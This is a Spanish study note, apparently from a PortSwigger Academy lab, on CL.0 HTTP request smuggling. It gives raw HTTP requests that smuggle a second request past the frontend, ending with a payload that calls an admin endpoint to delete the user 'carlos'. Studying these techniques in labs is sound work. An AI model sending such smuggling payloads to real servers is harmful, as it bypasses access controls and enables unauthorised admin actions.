---
title: "15 - CL.0 request smuggling"
---

# 15 - CL.0 request smuggling

Básicamente el CL.0 Significa que el frontend va a entender perfectamente el content-length , pero el backend simplemente no se esperaba una petición POST , asi que no interpreta nada y cree que todo lo que va después de las cabeceras es una nueva petición.

```HTTP
POST / HTTP/1.1/r/n
Host: 0a11001704e5a26881a1203e008800f5.web-security-academy.net/r/n
Content-Length: 27/r/n
Content-Type: application/x-www-form-urlencoded; charset=utf-8/r/n
Connection: keep-alive/r/n
/r/n
GET /404 HTTP/1.1/r/n
Foo: bar
```

Después de esto haces una petición normal, usando los groups de burpsuite y enviándola una detrás de otra con single connection : 

Tira código de estado esperado en ambas : no vulnerable
Tira código de estado esperado y en la otra 404 : vulnerable

Este si que tira 404 la segunda : 

```HTTP
POST /resources/images HTTP/1.1/r/n
Host: 0a11001704e5a26881a1203e008800f5.web-security-academy.net/r/n
Content-Length: 27/r/n
Content-Type: application/x-www-form-urlencoded; charset=utf-8/r/n
Connection: keep-alive/r/n
/r/n
GET /404 HTTP/1.1/r/n
Foo: bar
```

Normalmente este método suele funcionar en endpoints que no esperaban peticiones POST, solo GET.

```HTTP
POST /resources/images HTTP/1.1
Host: 0a11001704e5a26881a1203e008800f5.web-security-academy.net
Content-Length: 52
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: keep-alive

GET /admin/delete?username=carlos HTTP/1.1
Foo: bar
```
